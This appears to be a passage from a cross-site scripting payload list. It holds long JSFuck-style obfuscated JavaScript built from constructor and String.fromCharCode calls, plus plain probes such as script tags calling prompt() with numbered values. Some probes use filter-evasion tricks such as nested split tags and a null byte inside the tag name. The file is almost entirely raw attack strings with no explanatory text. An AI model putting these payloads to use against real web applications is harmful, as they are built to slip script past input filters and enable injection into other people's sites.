String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(94)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(94)")()+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+([false]+"")[12]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+(false+[0]+"")[7]+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+[]["constructor"]["constructor"]("return String.fromCharCode(1076)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+([false]+"")[12]+([false]+"")[13]+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+[]["constructor"]["constructor"]("return String.fromCharCode(949)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+([false]+"")[14]+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+([false]+"")[11]+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65392)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+([false]+"")[12]+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+(false+[0]+"")[7]+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+[]["constructor"]["constructor"]("return String.fromCharCode(952)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+([false]+"")[12]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+(false+[0]+"")[7]+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65392)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+(false+[0]+"")[7]+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+[]["constructor"]["constructor"]("return String.fromCharCode(1076)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+([false]+"")[12]+([false]+"")[13]+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+[]["constructor"]["constructor"]("return String.fromCharCode(949)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+([false]+"")[14]+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65392)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+(false+[0]+"")[7]+([false]+"")[11]+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(94)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(94)")()+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+(false+[0]+"")[7]+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+[]["constructor"]["constructor"]("return String.fromCharCode(1076)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+([false]+"")[12]+([false]+"")[13]+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+[]["constructor"]["constructor"]("return String.fromCharCode(949)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+([false]+"")[14]+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+[]["constructor"]["constructor"]("return String.fromCharCode(952)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+(false+[0]+"")[7]+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+[]["constructor"]["constructor"]("return String.fromCharCode(952)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+(false+[0]+"")[7]+([false]+"")[11]+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(94)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(94)")()+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+([false]+"")[12]+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(45)")()+(false+[0]+"")[7]+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+[]["constructor"]["constructor"]("return String.fromCharCode(952)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+([false]+"")[12]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+(false+[0]+"")[7]+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+[]["constructor"]["constructor"]("return String.fromCharCode(1076)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+([false]+"")[12]+([false]+"")[13]+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+[]["constructor"]["constructor"]("return String.fromCharCode(949)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+([false]+"")[14]+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+[]["constructor"]["constructor"]("return String.fromCharCode(952)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+(false+[0]+"")[7]+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65392)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+(false+[0]+"")[7]+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+[]["constructor"]["constructor"]("return String.fromCharCode(952)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+(false+[0]+"")[7]+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+[]["constructor"]["constructor"]("return String.fromCharCode(1076)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+([false]+"")[12]+([false]+"")[13]+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+[]["constructor"]["constructor"]("return String.fromCharCode(949)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+([false]+"")[14]+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+[]["constructor"]["constructor"]("return String.fromCharCode(952)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+(false+[0]+"")[7]+([false]+"")[11]+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(94)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(94)")()+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+([false]+"")[12]+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(94)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(94)")()+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+([false]+"")[12]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+(false+[0]+"")[7]+([false]+"")[11]+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(94)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(94)")()+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+([false]+"")[12]+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(94)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(94)")()+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+([false]+"")[12]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+(false+[0]+"")[7]+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+[]["constructor"]["constructor"]("return String.fromCharCode(1076)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+([false]+"")[12]+([false]+"")[13]+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+[]["constructor"]["constructor"]("return String.fromCharCode(949)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+([false]+"")[14]+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+[]["constructor"]["constructor"]("return String.fromCharCode(952)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+(false+[0]+"")[7]+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65392)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+(false+[0]+"")[7]+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+[]["constructor"]["constructor"]("return String.fromCharCode(952)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+(false+[0]+"")[7]+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+[]["constructor"]["constructor"]("return String.fromCharCode(1076)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+([false]+"")[12]+([false]+"")[13]+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+[]["constructor"]["constructor"]("return String.fromCharCode(949)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+([false]+"")[14]+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+[]["constructor"]["constructor"]("return String.fromCharCode(952)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+(false+[0]+"")[7]+([false]+"")[11]+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(94)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(94)")()+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+([false]+"")[12]+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(45)")()+(false+[0]+"")[7]+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+[]["constructor"]["constructor"]("return String.fromCharCode(952)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+([false]+"")[12]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+(false+[0]+"")[7]+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(94)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(94)")()+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+(false+[0]+"")[7]+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+[]["constructor"]["constructor"]("return String.fromCharCode(1076)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+([false]+"")[12]+([false]+"")[13]+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+[]["constructor"]["constructor"]("return String.fromCharCode(949)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+([false]+"")[14]+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+[]["constructor"]["constructor"]("return String.fromCharCode(952)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+(false+[0]+"")[7]+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65392)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+(false+[0]+"")[7]+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(94)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(94)")()+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+(false+[0]+"")[7]+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+[]["constructor"]["constructor"]("return String.fromCharCode(1076)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+([false]+"")[12]+([false]+"")[13]+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+[]["constructor"]["constructor"]("return String.fromCharCode(949)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+([false]+"")[14]+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+[]["constructor"]["constructor"]("return String.fromCharCode(952)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+(false+[0]+"")[7]+([false]+"")[11]+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(94)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(94)")()+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+([false]+"")[12]+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(94)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(94)")()+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+([false]+"")[12]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+(false+[0]+"")[7]+([false]+"")[11]+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(94)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(94)")()+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+([false]+"")[12]+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(45)")()+(false+[0]+"")[7]+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+[]["constructor"]["constructor"]("return String.fromCharCode(952)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+([false]+"")[12]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+(false+[0]+"")[7]+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+[]["constructor"]["constructor"]("return String.fromCharCode(1076)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+([false]+"")[12]+([false]+"")[13]+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+[]["constructor"]["constructor"]("return String.fromCharCode(949)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+([false]+"")[14]+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+[]["constructor"]["constructor"]("return String.fromCharCode(952)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+(false+[0]+"")[7]+([false]+"")[11]+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65392)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+([false]+"")[12]+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+(false+[0]+"")[7]+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+[]["constructor"]["constructor"]("return String.fromCharCode(952)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+([false]+"")[12]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+(false+[0]+"")[7]+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+[]["constructor"]["constructor"]("return String.fromCharCode(952)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+(false+[0]+"")[7]+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+[]["constructor"]["constructor"]("return String.fromCharCode(1076)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+([false]+"")[12]+([false]+"")[13]+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+[]["constructor"]["constructor"]("return String.fromCharCode(949)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+([false]+"")[14]+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+[]["constructor"]["constructor"]("return String.fromCharCode(952)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+(false+[0]+"")[7]+([false]+"")[11]+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(94)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(94)")()+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+([false]+"")[12]+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(94)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(94)")()+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+([false]+"")[12]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+(false+[0]+"")[7]+([false]+"")[11]+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(94)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(94)")()+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+(false+[0]+"")[7]+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+[]["constructor"]["constructor"]("return String.fromCharCode(1076)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+([false]+"")[12]+([false]+"")[13]+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+[]["constructor"]["constructor"]("return String.fromCharCode(949)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+([false]+"")[14]+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+[]["constructor"]["constructor"]("return String.fromCharCode(952)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+(false+[0]+"")[7]+([false]+"")[11]+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(94)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(94)")()+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+([false]+"")[12]+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(94)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(94)")()+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+([false]+"")[12]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+(false+[0]+"")[7]+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65392)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+(false+[0]+"")[7]+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+[]["constructor"]["constructor"]("return String.fromCharCode(1076)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+([false]+"")[12]+([false]+"")[13]+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+[]["constructor"]["constructor"]("return String.fromCharCode(949)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+([false]+"")[14]+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65392)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+(false+[0]+"")[7]+([false]+"")[11]+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(94)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(94)")()+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+([false]+"")[12]+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(45)")()+(false+[0]+"")[7]+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+[]["constructor"]["constructor"]("return String.fromCharCode(952)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+([false]+"")[12]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+(false+[0]+"")[7]+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+[]["constructor"]["constructor"]("return String.fromCharCode(1076)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+([false]+"")[12]+([false]+"")[13]+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+[]["constructor"]["constructor"]("return String.fromCharCode(949)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+([false]+"")[14]+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+([false]+"")[11]+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65392)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+([false]+"")[12]+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+(false+[0]+"")[7]+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+[]["constructor"]["constructor"]("return String.fromCharCode(952)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+([false]+"")[12]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+(false+[0]+"")[7]+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+[]["constructor"]["constructor"]("return String.fromCharCode(952)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+(false+[0]+"")[7]+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+[]["constructor"]["constructor"]("return String.fromCharCode(1076)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+([false]+"")[12]+([false]+"")[13]+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+([false]+"")[14]+([false]+"")[12]+(false+[0]+"")[7]+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+[]["constructor"]["constructor"]("return String.fromCharCode(952)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+([false]+"")[12]+([false]+"")[12]+(false+[0]+"")[7]+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(39)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(39)")()+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(59)")()
<script
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]
>prompt(461);</script>
[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(59)")()+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<scr<script>itp>prompt(463);</scr</script>itp>
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+(false+"")[3]+([false]+"")[3]+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+([false]+"")[10]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(59)")()+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+(false+"")[3]+([false]+"")[3]+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+([false]+"")[10]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<scr\x00ipt>prompt(465);</scr\x00ipt>
